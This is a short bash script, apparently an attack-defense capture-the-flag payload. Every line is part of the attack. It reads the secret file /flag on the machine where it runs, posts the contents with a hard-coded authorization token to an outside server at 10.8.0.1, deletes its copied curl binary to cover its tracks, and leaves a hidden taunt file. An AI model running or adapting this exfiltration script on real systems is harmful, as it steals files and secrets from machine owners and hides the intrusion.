#!/bin/bash
cp -r /tmp/safedir/static/curl /tmp
flag1=$(cat /flag)
/tmp/curl/bin/curl -X POST http://10.8.0.1:19999/api/flag -H "Authorization: 1144d0ffa41e4ac766ea371c413da8f0" -d "{ \"flag\": \"$flag1\" }"
rm -rf /tmp/curl
echo yes > /tmp/.fuckyou

